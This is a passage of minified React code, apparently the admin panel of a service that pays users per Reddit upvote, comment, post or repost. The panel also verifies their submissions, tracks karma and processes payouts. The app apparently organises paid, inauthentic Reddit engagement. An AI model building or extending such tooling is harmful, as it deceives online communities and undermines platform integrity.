shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Paid"}),s.jsxs("button",{onClick:()=>E("Reports"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${w==="Reports"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Reports",v.length>0&&s.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:v.length})]})]}),w==="Tasks"?s.jsxs(s.Fragment,{children:[s.jsxs("form",{onSubmit:cn,className:"space-y-6 sm:space-y-8",children:[s.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-8",children:[s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Ds,{size:14})," Task Tier"]}),s.jsxs("div",{className:"relative",ref:Tr,children:[s.jsxs("div",{onClick:()=>Cr(!hr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:"text-white font-medium",children:_e}),s.jsx(cr,{size:18,className:`text-gray-500 transition-transform ${hr?"rotate-180":""}`})]}),hr&&s.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["Tier 1","Tier 2","Tier 3"].map(p=>s.jsx("div",{onClick:()=>{Q(p),Cr(!1)},className:`px-4 py-3 rounded-xl text-xs font-bold cursor-pointer transition-all mb-1 last:mb-0 ${_e===p?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:p},p))})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(pl,{size:14})," Subreddit"]}),s.jsx("input",{type:"text",required:!0,placeholder:"e.g. MovingToLondon",value:fe,onChange:p=>xe(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Pf,{size:14})," Task Title"]}),s.jsx("input",{type:"text",required:!0,placeholder:"e.g. Upvote and Comment on r/tech",value:je,onChange:p=>Ce(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(ml,{size:14})," Category"]}),s.jsxs("div",{className:"relative",ref:fr,children:[s.jsxs("div",{onClick:()=>Pr(!Rr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:"text-white font-bold uppercase tracking-tight",children:B}),s.jsx(cr,{size:18,className:`text-gray-500 transition-transform ${Rr?"rotate-180":""}`})]}),Rr&&s.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["COMMENT","POST","UPVOTE","REPLY TO COMMENT","REPOST"].map(p=>s.jsx("div",{onClick:()=>{Ae(p),Pr(!1)},className:`px-4 py-3 rounded-xl text-[10px] font-black cursor-pointer transition-all mb-1 last:mb-0 tracking-widest uppercase ${B===p?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:p},p))})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Os,{size:14})," Reward Amount"]}),s.jsxs("div",{className:"relative",children:[s.jsx("span",{className:"absolute left-5 top-1/2 -translate-y-1/2 text-gray-500 text-sm",children:"$"}),s.jsx("input",{type:"text",required:!0,placeholder:"0.50",value:et,onChange:p=>ct(p.target.value),className:"w-full pl-10 pr-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Fr,{size:14})," Deadline"]}),s.jsxs("div",{className:"relative",ref:Ft,children:[s.jsxs("div",{onClick:()=>os(!er),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:Ne?"text-white font-medium":"text-gray-600",children:Ne?new Date(Ne).toLocaleString([],{dateStyle:"medium",timeStyle:"short"}):"Select date and time"}),s.jsx(Fr,{size:18,className:`text-gray-500 group-hover:text-blue-500 transition-colors ${er?"text-blue-500":""}`})]}),er&&s.jsxs("div",{className:"absolute top-full left-0 right-0 sm:right-auto sm:w-80 mt-2 p-4 bg-[#0a0a0a] border border-white/10 rounded-3xl shadow-2xl z-[60] animate-in fade-in slide-in-from-top-2 duration-200",children:[s.jsxs("div",{className:"flex items-center justify-between mb-4 px-1",children:[s.jsx("button",{type:"button",onClick:()=>zs(new Date(Oe.getFullYear(),Oe.getMonth()-1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:s.jsx(cr,{size:18,className:"rotate-90"})}),s.jsx("span",{className:"text-xs font-black uppercase italic tracking-widest text-blue-500",children:new Intl.DateTimeFormat("en-US",{month:"long",year:"numeric"}).format(Oe)}),s.jsx("button",{type:"button",onClick:()=>zs(new Date(Oe.getFullYear(),Oe.getMonth()+1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:s.jsx(cr,{size:18,className:"-rotate-90"})})]}),s.jsxs("div",{className:"grid grid-cols-7 gap-1 mb-2",children:[["S","M","T","W","T","F","S"].map(p=>s.jsx("div",{className:"text-[10px] font-black text-gray-600 text-center py-1 uppercase",children:p},p)),Array.from({length:new Date(Oe.getFullYear(),Oe.getMonth(),1).getDay()}).map((p,O)=>s.jsx("div",{},`empty-${O}`)),Array.from({length:new Date(Oe.getFullYear(),Oe.getMonth()+1,0).getDate()}).map((p,O)=>{const L=O+1,W=Ne&&new Date(Ne).getDate()===L&&new Date(Ne).getMonth()===Oe.getMonth()&&new Date(Ne).getFullYear()===Oe.getFullYear();return s.jsx("div",{onClick:()=>{const G=new Date(Oe.getFullYear(),Oe.getMonth(),L),Tt=Ne?new Date(Ne):new Date;G.setHours(Tt.getHours()),G.setMinutes(Tt.getMinutes());const Le=Te=>Te.toString().padStart(2,"0");kt(`${G.getFullYear()}-${Le(G.getMonth()+1)}-${Le(G.getDate())}T${Le(G.getHours())}:${Le(G.getMinutes())}`)},className:`aspect-square flex items-center justify-center text-[11px] font-bold rounded-lg cursor-pointer transition-all ${W?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:L},L)})]}),s.jsxs("div",{className:"mt-4 pt-4 border-t border-white/5 flex items-center justify-between gap-4",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Fr,{size:14,className:"text-gray-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-wider",children:"Time"})]}),s.jsxs("div",{className:"flex items-center gap-1",children:[s.jsx("input",{type:"number",min:"0",max:"23",value:Ne?new Date(Ne).getHours():12,onChange:p=>{const O=Math.max(0,Math.min(23,parseInt(p.target.value)||0)),L=Ne?new Date(Ne):new Date;L.setHours(O);const W=G=>G.toString().padStart(2,"0");kt(`${L.getFullYear()}-${W(L.getMonth()+1)}-${W(L.getDate())}T${W(L.getHours())}:${W(L.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"}),s.jsx("span",{className:"text-gray-600 font-bold",children:":"}),s.jsx("input",{type:"number",min:"0",max:"59",value:Ne?new Date(Ne).getMinutes():0,onChange:p=>{const O=Math.max(0,Math.min(59,parseInt(p.target.value)||0)),L=Ne?new Date(Ne):new Date;L.setMinutes(O);const W=G=>G.toString().padStart(2,"0");kt(`${L.getFullYear()}-${W(L.getMonth()+1)}-${W(L.getDate())}T${W(L.getHours())}:${W(L.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"})]})]})]})]})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(pl,{size:14})," Target Reddit URL"]}),s.jsx("input",{type:"url",required:!0,placeholder:"https://www.reddit.com/r/...",value:dr,onChange:p=>it(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(ss,{size:14})," Assign to User"]}),s.jsxs("div",{className:"relative",ref:pr,children:[s.jsxs("div",{onClick:()=>tr(!Ar),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:st==="All"?"text-gray-500":"text-white font-medium",children:un}),s.jsx(cr,{size:18,className:`text-gray-500 transition-transform ${Ar?"rotate-180":""}`})]}),Ar&&s.jsxs("div",{className:"absolute top-full left-0 right-0 mt-2 p-3 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:[s.jsxs("div",{className:"relative mb-3",children:[s.jsx(Gc,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:14}),s.jsx("input",{type:"text",placeholder:"Search server or reddit name...",value:Bt,onChange:p=>Br(p.target.value),autoFocus:!0,className:"w-full pl-10 pr-4 py-2.5 bg-white/[0.05] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-xs"})]}),s.jsxs("div",{className:"max-h-60 overflow-y-auto space-y-1 custom-scrollbar",children:[s.jsx("div",{onClick:()=>{_t("All"),tr(!1)},className:`px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all ${st==="All"?"bg-blue-600 text-white":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:"Everyone (Public)"}),qt.map(p=>s.jsxs("div",{onClick:()=>{_t(p.email),tr(!1)},className:`px-4 py-2.5 rounded-xl text-xs cursor-pointer transition-all ${st===p.email?"bg-blue-600 text-white font-bold":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:[s.jsx("div",{className:"font-bold",children:p.server_username||p.email.split("@")[0]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsxs("div",{className:"text-[10px] opacity-60",children:["u/",p.reddit_username||"not_connected"]}),p.reddit_karma!=null?s.jsxs("div",{className:"text-[10px] opacity-60 text-blue-400",children:[" ",p.reddit_karma.toLocaleString()," karma"]}):p.reddit_username&&p.reddit_username!=="not_connected"?s.jsx("div",{className:"text-[10px] opacity-40 text-blue-400 animate-pulse",children:" fetching karma..."}):null,p.discord_username&&s.jsxs("div",{className:"text-[10px] opacity-60 flex items-center gap-1",children:[s.jsx(Er,{size:10})," ",p.discord_username]})]})]},p.email)),qt.length===0&&Bt!==""&&s.jsxs("div",{className:"py-8 text-center text-gray-600 text-xs italic",children:['No users found matching "',Bt,'"']})]})]})]}),s.jsx("p",{className:"text-[10px] text-gray-600 ml-1",children:"Select a specific user or keep it public."})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:"Instructions for Users"}),s.jsx("textarea",{rows:5,required:!0,placeholder:"Detail exactly what the user needs to do...",value:ft,onChange:p=>At(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),s.jsxs("div",{className:"flex flex-col sm:flex-row gap-4 pt-6",children:[s.jsxs("button",{type:"button",onClick:mr,className:"w-full sm:w-auto px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all flex items-center justify-center gap-2",children:[s.jsx($s,{size:18}),_?"Cancel Edit":"Reset Form"]}),s.jsxs("button",{type:"submit",className:"w-full sm:flex-1 py-4 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 flex items-center justify-center gap-2 group",children:[s.jsx(Vn,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"}),_?"Update Task":"Publish Task to Network"]})]})]}),s.jsxs("section",{className:"mt-20",children:[s.jsx("h2",{className:"text-xl font-bold mb-8",children:"Existing Tasks"}),s.jsx("div",{className:"space-y-4",children:c.filter(p=>p.status!=="verified").length>0?c.filter(p=>p.status!=="verified").map(p=>s.jsx("div",{className:`p-6 rounded-3xl border transition-all ${p.is_hidden?"bg-white/[0.01] border-white/5 opacity-50":"bg-white/[0.03] border-white/10"}`,children:s.jsxs("div",{className:"flex items-center justify-between gap-4",children:[s.jsxs("div",{className:"flex-1",children:[s.jsxs("div",{className:"flex items-center gap-3 mb-1",children:[s.jsx("span",{className:"text-xs font-black text-blue-500",children:p.task_id_display}),s.jsx("h3",{className:"font-bold",children:p.title}),s.jsx("span",{className:`text-[9px] uppercase font-black px-2 py-0.5 rounded ${p.tier==="Tier 3"?"bg-red-500/10 text-red-500":p.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:p.tier}),s.jsx("span",{className:"text-[10px] uppercase font-bold text-gray-500 bg-white/5 px-2 py-0.5 rounded",children:p.category}),s.jsx("span",{className:`text-[10px] font-bold px-2 py-0.5 rounded ${p.assigned_to==="All"?"text-emerald-500 bg-emerald-500/10":"text-orange-500 bg-orange-500/10"}`,children:p.assigned_to==="All"?"PUBLIC":`PRIVATE: ${p.assigned_to}`})]}),s.jsx("p",{className:"text-xs text-gray-500 truncate max-w-md",children:p.reddit_url})]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("button",{onClick:()=>Jn(p),className:"p-2 hover:bg-white/10 rounded-lg text-gray-400",title:p.is_hidden?"Show":"Hide",children:p.is_hidden?s.jsx(Ef,{size:18}):s.jsx(Hc,{size:18})}),s.jsx("button",{onClick:()=>Ls(p),className:"p-2 hover:bg-blue-600/20 rounded-lg text-blue-500",title:"Edit",children:s.jsx(Kc,{size:18})}),s.jsx("button",{onClick:()=>Wr(p.id),className:"p-2 hover:bg-red-600/20 rounded-lg text-red-500",title:"Delete",children:s.jsx($s,{size:18})})]})]})},p.id)):s.jsx("p",{className:"text-gray-500 text-center py-10",children:"No active tasks found in database."})})]})]}):w==="Verification"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsx("h2",{className:"text-xl font-bold mb-8 italic uppercase tracking-tight",children:"Pending Submissions"}),c.filter(p=>p.status==="submitted").length>0?c.filter(p=>p.status==="submitted").map(p=>s.jsx("div",{className:"bg-white/[0.02] border border-white/5 rounded-[32px] p-5 sm:p-8 hover:border-blue-500/20 transition-all",children:s.jsxs("div",{className:"flex flex-col md:flex-row justify-between gap-6",children:[s.jsxs("div",{className:"flex-1 space-y-4",children:[s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("span",{className:"text-[10px] font-black text-blue-500",children:p.task_id_display}),s.jsx("h3",{className:"font-bold text-white text-lg",children:p.title}),s.jsx("span",{className:"text-[9px] font-black bg-amber-500/10 text-amber-500 px-2 py-0.5 rounded uppercase",children:p.tier})]}),s.jsxs("div",{className:"flex flex-wrap gap-4 text-[11px] text-gray-500",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(ss,{size:14}),s.jsx("span",{className:"font-bold text-gray-300",children:p.claimed_by})]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Os,{size:14}),s.jsx("span",{className:"font-bold text-emerald-500",children:p.reward})]})]}),s.jsxs("div",{className:"space-y-3 pt-4",children:[s.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Main Link"}),s.jsx("a",{href:p.submission_data?.main_link,target:"_blank",rel:"noreferrer",className:"text-xs text-blue-500 hover:underline break-all",children:p.submission_data?.main_link})]}),p.submission_data?.random_comments&&p.submission_data.random_comments.some(O=>O!=="")&&s.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Random Comments"}),s.jsx("div",{className:"space-y-2",children:p.submission_data.random_comments.map((O,L)=>O&&s.jsxs("a",{href:O,target:"_blank",rel:"noreferrer",className:"text-[10px] text-gray-400 hover:text-white block hover:underline truncate",children:[L+1,". ",O]},L))})]})]})]}),s.jsxs("div",{className:"flex flex-row md:flex-col gap-3 justify-end",children:[s.jsxs("button",{onClick:()=>qr(p),className:"flex-1 md:flex-none px-8 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2",children:[s.jsx(jt,{size:18,strokeWidth:3}),"VERIFY"]}),s.jsxs("button",{onClick:()=>cs(p),className:"flex-1 md:flex-none px-8 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2",children:[s.jsx(De,{size:18,strokeWidth:3}),"REJECT"]}),s.jsxs("button",{onClick:()=>$r(p.claimed_by),className:"flex-1 md:flex-none px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/10 transition-all flex items-center justify-center gap-2",children:[s.jsx(Er,{size:18}),"ALERT"]})]})]})},p.id)):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(rs,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"All caught up! No pending submissions."})]})]}):w==="Users"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Registered Users"}),s.jsx("button",{onClick:()=>Ir(!0),className:"p-2 hover:bg-white/5 rounded-xl text-gray-500 hover:text-blue-500 transition-all group",title:"Refresh Karma for everyone",children:s.jsx(Fr,{size:16,className:"group-hover:rotate-180 transition-transform duration-500"})})]}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),s.jsx("span",{className:"text-sm font-black text-white",children:h.length})]})]}),h.length>0?s.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:h.map(p=>{const O=c.filter(G=>G.claimed_by===p.email&&(G.status==="verified"||G.status==="submitted")),L=M===p.email,W=x.filter(G=>G.user_email===p.email&&G.status==="pending");return s.jsxs("div",{className:`bg-white/[0.02] border rounded-[28px] p-4 sm:p-6 transition-all ${W.length>0?"border-red-500/30":"border-white/5 hover:border-blue-500/20"}`,children:[s.jsxs("div",{className:"flex items-start gap-4 mb-4",children:[s.jsxs("div",{className:"relative",children:[s.jsx("div",{className:"w-12 h-12 bg-gradient-to-br from-blue-600 to-purple-600 rounded-2xl flex items-center justify-center text-white font-black text-lg flex-shrink-0",children:(p.server_username||p.email)[0].toUpperCase()}),W.length>0&&s.jsx("div",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 border-2 border-[#0a0a0a] rounded-full animate-pulse shadow-lg shadow-red-500/40"})]}),s.jsxs("div",{className:"flex-1 min-w-0",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("h3",{className:"font-bold text-white text-sm truncate",children:p.server_username||p.email.split("@")[0]}),W.length>0&&s.jsx("span",{className:"text-[8px] font-black bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded uppercase tracking-tighter",children:"Withdrawal Req"})]}),s.jsx("p",{className:"text-[11px] text-gray-500 truncate",children:p.email}),p.reddit_username&&s.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[s.jsxs("a",{href:`https://reddit.com/u/${p.reddit_username}`,target:"_blank",rel:"noreferrer",className:"text-[10px] text-orange-500 font-bold hover:underline flex items-center gap-1",children:["u/",p.reddit_username,s.jsx(Fa,{size:10})]}),p.reddit_karma!=null?s.jsxs("span",{className:"text-[10px] text-blue-400 font-bold",children:[" ",p.reddit_karma.toLocaleString()," karma"]}):s.jsx("span",{className:"text-[10px] text-blue-400/40 font-bold animate-pulse",children:" fetching..."})]})]})]}),s.jsxs("div",{className:"grid grid-cols-1 gap-2 mb-4",children:[s.jsxs("div",{className:"flex items-center justify-between p-3 bg-emerald-500/5 border border-emerald-500/10 rounded-xl",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Hn,{size:14,className:"text-emerald-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Current Balance"})]}),s.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",(p.balance||0).toFixed(2)]})]}),W.length>0&&s.jsx("div",{className:"space-y-2",children:W.map(G=>s.jsxs("div",{className:"p-3 bg-red-500/5 border border-red-500/10 rounded-xl",children:[s.jsxs("div",{className:"flex items-center justify-between mb-2",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Os,{size:14,className:"text-red-500"}),s.jsxs("div",{className:"flex flex-col",children:[s.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase",children:"Withdrawal Request"}),s.jsx("span",{className:"text-[9px] font-mono text-gray-500",children:G.transaction_id})]})]}),s.jsxs("span",{className:"text-sm font-black text-red-500",children:["$",G.amount.toFixed(2)]})]}),s.jsxs("div",{className:"flex items-center justify-between gap-3 px-2 py-1.5 bg-white/[0.03] rounded-lg",children:[s.jsxs("div",{className:"flex items-center gap-2 flex-1 min-w-0",children:[s.jsx("img",{src:ll[G.payout_method.type],alt:G.payout_method.label,className:"w-3.5 h-3.5 object-contain"}),s.jsxs("div",{className:"flex flex-col min-w-0",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-400 uppercase leading-none mb-0.5",children:G.payout_method.label}),s.jsx("span",{className:"text-[10px] font-bold text-gray-200 truncate",children:G.payout_method.value})]})]}),s.jsx("button",{onClick:()=>Yn(G),className:"px-3 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-[9px] font-black rounded-lg transition-all shadow-lg shadow-emerald-600/10 whitespace-nowrap",children:"PAID"})]})]},G.id))})]}),s.jsxs("div",{className:"mb-4",children:[s.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[s.jsx(jl,{size:14,className:"text-gray-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Payout Methods"})]}),p.payout_methods&&p.payout_methods.length>0?s.jsx("div",{className:"flex flex-wrap gap-2",children:p.payout_methods.map(G=>s.jsxs("div",{className:"flex items-center gap-2 px-3 py-1.5 bg-white/[0.03] border border-white/5 rounded-xl",children:[s.jsx("img",{src:ll[G.type],alt:G.label,className:"w-4 h-4 object-contain"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-300 truncate max-w-[100px]",children:G.value})]},G.id))}):s.jsx("p",{className:"text-[10px] text-gray-600 italic",children:"No payout methods"})]}),s.jsxs("div",{children:[s.jsxs("button",{onClick:()=>be(L?null:p.email),className:"w-full flex items-center justify-between p-3 bg-white/[0.02] border border-white/5 rounded-xl hover:bg-white/[0.04] transition-all",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(rs,{size:14,className:"text-blue-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Completed Tasks"})]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("span",{className:"text-xs font-black text-white",children:O.length}),s.jsx(cr,{size:14,className:`text-gray-500 transition-transform ${L?"rotate-180":""}`})]})]}),L&&O.length>0&&s.jsx("div",{className:"mt-2 p-3 bg-black/40 rounded-xl border border-white/5 space-y-2 max-h-48 overflow-y-auto",children:O.map(G=>s.jsxs("div",{className:"flex items-center justify-between gap-2 p-2 bg-white/[0.02] rounded-lg",children:[s.jsxs("div",{className:"flex-1 min-w-0",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("span",{className:"text-[9px] font-black text-blue-500",children:G.task_id_display}),s.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${G.status==="verified"?"bg-emerald-500/10 text-emerald-500":"bg-amber-500/10 text-amber-500"}`,children:G.status})]}),s.jsx("p",{className:"text-[10px] text-gray-300 truncate",children:G.title})]}),G.submission_data?.main_link&&s.jsx("a",{href:G.submission_data.main_link,target:"_blank",rel:"noreferrer",className:"p-1.5 text-gray-500 hover:text-blue-500 hover:bg-blue-500/10 rounded-lg transition-all flex-shrink-0",title:"View submission",children:s.jsx(Fa,{size:12})})]},G.id))}),L&&O.length===0&&s.jsx("div",{className:"mt-2 p-4 bg-black/40 rounded-xl border border-white/5 text-center",children:s.jsx("p",{className:"text-[10px] text-gray-600",children:"No tasks completed yet"})})]})]},p.email)})}):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(Jc,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No users registered yet."})]})]}):w==="Reports"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"User Reported Issues"}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Active: "}),s.jsx("span",{className:"text-sm font-black text-white",children:v.length})]})]}),s.jsx("div",{className:"space-y-4",children:v.length>0?v.map(p=>s.jsx("div",{className:"bg-white/[0.02] border border-white/5 p-6 rounded-[32px] group hover:border-red-500/20 transition-all",children:s.jsxs("div",{className:"flex flex-col sm:flex-row justify-between items-start gap-6",children:[s.jsxs("div",{className:"flex-1 space-y-4",children:[s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("div",{className:"w-10 h-10 bg-red-500/10 rounded-xl flex items-center justify-center border border-red-500/20 text-red-500",children:s.jsx(at,{size:20})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase tracking-widest",children:"Reported Problem"}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase",children:new Date(p.created_at).toLocaleString()})]}),s.jsx("h4",{className:"text-sm font-bold text-white mt-0.5",children:p.message.split(" | ")[2]?.replace("PROBLEM: ","")||"No details provided"})]})]}),s.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[s.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"User Email"}),s.jsx("span",{className:"text-xs text-gray-300 font-bold",children:p.message.split(" | ")[0]?.replace("FROM: ","")||"Unknown"})]}),s.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"Task ID"}),s.jsx("span",{className:"text-xs text-blue-500 font-black",children:p.message.split(" | ")[1]?.replace("TASK: ","")||"N/A"})]})]})]}),s.jsxs("div",{className:"flex flex-row sm:flex-col gap-2 w-full sm:w-auto",children:[s.jsxs("button",{onClick:()=>$r(p.message.split(" | ")[0]?.replace("FROM: ","")),className:"flex-1 sm:flex-none px-6 py-3 bg-blue-600/10 text-blue-500 rounded-xl font-bold text-xs hover:bg-blue-600 hover:text-white transition-all flex items-center justify-center gap-2",children:[s.jsx(Er,{size:16}),"REPLY"]}),s.jsxs("button",{onClick:()=>ln(p.id),className:"flex-1 sm:flex-none px-6 py-3 bg-white/[0.03] border border-white/10 text-gray-500 rounded-xl font-bold text-xs hover:text-white hover:bg-red-600 